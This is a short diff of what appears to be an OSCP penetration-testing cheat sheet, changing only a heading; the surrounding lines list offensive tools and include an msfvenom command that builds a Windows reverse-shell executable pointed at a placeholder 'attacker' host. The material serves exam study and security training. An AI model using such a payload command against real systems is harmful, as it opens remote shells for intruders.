@@ -400,7 +400,7 @@
 | **msfvenom**      | Payload generation                        | `msfvenom -p windows/shell_reverse_tcp LHOST=attacker LPORT=4444 -f exe -o shell.exe` | Generates reverse shell binaries |
 | **Metasploit**    | Exploits + post modules                   | `msfconsole` → use exploits | Interactive exploit framework with session management |
 
-## 📝 OSCP Pro Tips
+## OSCP Pro Tips
 - Always start with **Nmap**, **AutoRecon**, and web enumeration tools.
 - Use **Burp**, **WFUF**, and **Feroxbuster** for web fuzzing.
 - After access, use **LinPEAS** or **WinPEAS** for privilege escalation paths.
